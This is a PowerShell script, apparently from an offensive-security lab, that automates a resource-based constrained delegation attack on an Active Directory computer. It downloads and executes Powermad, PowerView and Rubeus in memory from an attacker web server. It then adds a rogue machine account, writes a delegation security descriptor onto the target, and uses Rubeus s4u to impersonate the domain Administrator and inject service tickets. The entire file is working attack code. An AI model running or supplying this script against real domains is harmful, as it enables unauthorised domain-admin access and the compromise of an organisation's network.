# needs three arguments and then automagically does the resource based constrained delegation attack
# in the current context.
# Usage:   PS C:\AutoRBCD.ps1 -WebServer -Target -Domain
# Example: PS C:\AutoRBCD.ps1 -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com
#--------------------------------------------------------------------------------------------------------

param($WebServer, $Target, $Domain)
# get current directory
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
# load the files into memory and import them
Write-Host "[+] Check if the files are present"

If (-Not(Test-Path -Path "$ScriptDir\Powermad.ps1")){
iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/Powermad.ps1")
}
If (-Not(Test-Path -Path "$ScriptDir\PowerView.ps1")){
iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/PowerView.ps1")
}
If (-Not(Test-Path -Path "$ScriptDir\Rubeus.exe")){
$ruby = (New-Object System.Net.WebClient).DownloadData("http://$WebServer/Rubeus.exe")
$assem = [System.Reflection.Assembly]::Load($ruby)
}

# generate a random computer name
$MachineName = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})

Write-Host "[+] Add a Machine with the name $MachineName"
# add the machine account that we just created (Powermad)
New-MachineAccount -MachineAccount $MachineName -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

Write-Host "[+] SID Stuff"
# get the SID of the new computer we've added
$ComputerSid = Get-DomainComputer $MachineName -Properties objectsid | Select -Expand objectsid

# build the new raw security descriptor with this computer account as the principal
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

# get the binary bytes for the SD
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Write-Host "[+] Set the msds-allowedtoactonbehalfofotheridentity property"
# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
Get-DomainComputer $Target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# purge tickets
[Rubeus.Program]::Main("purge".Split())

$fqdn = -join($Target,".",$Domain)
# execute Rubeus' s4u process against $TargetComputer
#   AA6EAFB522589934A6E5CE92C6438221 == 'h4x'
#   impersonating "Administrator" (a DA) to the cifs sname for the target computer (primary)
[Rubeus.Program]::Main("s4u /user:$MachineName`$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/$fqdn /altservice:http,ldap,krbtgt,winrm /ptt".Split())
